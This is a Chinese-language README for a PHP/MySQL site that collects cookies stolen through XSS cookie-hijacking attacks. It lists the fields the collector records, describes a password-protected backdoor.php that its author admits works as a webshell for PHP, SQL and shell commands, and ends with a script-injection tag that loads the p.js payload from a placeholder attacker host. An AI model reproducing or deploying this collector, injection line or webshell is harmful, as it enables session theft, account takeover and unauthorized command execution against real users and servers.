#XSS So easy
##简介
此网站用于XSS Cookie 劫持攻击中接收Cookie  
花了半天写出来，简单美化一下，不知道外观如何  
适用于 PHP MySQL  

##使用方法
配置config.php，填写数据库用户名、密码等信息。  
install.php：创建数据库、表等操作  
write.php：GET或者POST得到的Cookie。  
需要提交的参数为domain location toplocation cookie opener。  
含有payload：p.js  

##附加功能
读、写密码  
自定义网站名称（title和页面中显示）  
自定义开发者信息（底部显示）  

##TODO
PHP提醒，mysql_connect()函数以后会被抛弃。考虑改写成新版函数。  

##Update
###2015-9-12 21:05:48
一条不当的payload，使数据库里多了几百条垃圾数据。  
于是我写了执行SQL语句的backdoor.php。（支持密码）  

###2015-9-16 10:44:21
自我感觉默认配置的颜色过于小清新。于是分离出color.css文件，可以自行配置颜色。  
出于复（xián）习（de）知（dàn）识（téng）的目的，做了个color.php，向color.css写入数据。  
后门支持PHP、SQL、shell命令执行，且支持SQL SELECT命令结果显示。SQL的INSERT UPDATE DELETE影响行数显示。（突然发现做了个WebShell）  
输出表格增加\n使HTML源文件易读。  
由于空字符串在if语句中效果同false，因此system()返回最后一行为空时应使用if($foo !== FALSE)。其他情况同理。  
改变字体为等宽字体。个别地方，中文使用微软雅黑。  
使用Eclipse排版一下。其他一些细节调整优化。  

###2015-9-16 22:25:33
CSS文件已改为PHP文件读写。  
在Windows上运行系统命令时输出字符集为GBK，增加自动转换为UTF-8。  

###2015-9-21 21:26:59
密码验证方式由GET改为POST，并增加install和testMySql页面密码功能  
分离出CSS文件，并移动到style/main.css  
增加read.php条件查询  

###2015-10-20 15:45:32
修改数据库，更改url字段名为location并允许NULL，增加toplocation（用于框架）、opener。  
从旧的数据库变更请在backdoor.php执行SQL命令：  

	alter table info change url location longtext NULL
	alter table info add toplocation longtext
	alter table info modify column cookie longtext after toplocation
	alter table info add opener longtext
	describe info  

增加p.js作为payload，修改内部write.php域名和路径即可使用。  
`<script src=http://xxx.xxx/p.js></script>`  